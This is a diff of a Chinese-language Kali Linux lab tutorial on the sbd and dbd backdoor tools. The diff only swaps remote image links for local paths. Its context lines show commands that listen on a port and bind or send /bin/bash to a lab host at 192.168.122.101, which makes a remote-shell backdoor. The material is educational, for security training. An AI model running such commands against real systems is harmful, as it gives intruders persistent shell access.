@@ -23,7 +23,7 @@
 
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1482820148587.png-wm)
+![图片描述](../imgs/1482820148587.png-wm)
 
 
 ## 二、环境启动
@@ -42,7 +42,7 @@ ssh root@Kali
 
 如果一切顺利，你将会看到如下页面：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481188145695.png-wm)
+![图片描述](../imgs/1481188145695.png-wm)
 
 
 ## 三、原理介绍
@@ -78,7 +78,7 @@ ssh root@Kali
 > https://github.com/gitdurandal/dbd
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481192591459.png-wm)
+![图片描述](../imgs/1481192591459.png-wm)
 
 
 ## 四、使用方法
@@ -91,7 +91,7 @@ ssh root@Kali
 # 查看 sbd 命令的帮助选项
 sbd -h
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481090277973.png-wm)
+![图片描述](../imgs/1481090277973.png-wm)
 
 
 ### 4.2 `sbd` 的使用
@@ -118,7 +118,7 @@ sbd -l -p 4445 -e bash -v -n
 # 连接 Kali 虚拟机
 ssh root@Kali
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481092769638.png-wm)
+![图片描述](../imgs/1481092769638.png-wm)
 
 使用 `sbd` 连接所监听的端口，在 Kali 的命令终端中输入如下命令：
 
@@ -126,7 +126,7 @@ ssh root@Kali
 # 使用简单的命令连接主机，及其相应的端口
 sbd 192.168.122.101 4445
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481093216155.png-wm)
+![图片描述](../imgs/1481093216155.png-wm)
 
 连接成功后，输入命令，进行验证：
 
@@ -142,7 +142,7 @@ pwd
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481093324909.png-wm)
+![图片描述](../imgs/1481093324909.png-wm)
 
 
 ### 4.3 `Dbd` 参数选项
@@ -152,7 +152,7 @@ pwd
 # 查看 dbd 帮助选项
 dbd -h
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481090167469.png-wm)
+![图片描述](../imgs/1481090167469.png-wm)
 
 
 ### 4.4 `Dbd` 的使用
@@ -171,7 +171,7 @@ dbd -l -p 8080 -v
 | `-p`     | 连接过程中，服务器侦听的具体端口号 |
 | `-v`     | 输出连接时产生的详细信息           |
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481094638641.png-wm)
+![图片描述](../imgs/1481094638641.png-wm)
 
 
 接着在另一个 Kali 终端中，输入命令，进行连接交互：
@@ -181,7 +181,7 @@ dbd -l -p 8080 -v
 dbd -r 2400 -D on -v -e /bin/bash 192.168.122.101 8080
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481094716075.png-wm)
+![图片描述](../imgs/1481094716075.png-wm)
 
 在上面的这条命令中，其中参数所代表的具体含义分别为：
 
@@ -215,7 +215,7 @@ ls
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481094873850.png-wm)
+![图片描述](../imgs/1481094873850.png-wm)
 
 
 ## 五、思考总结
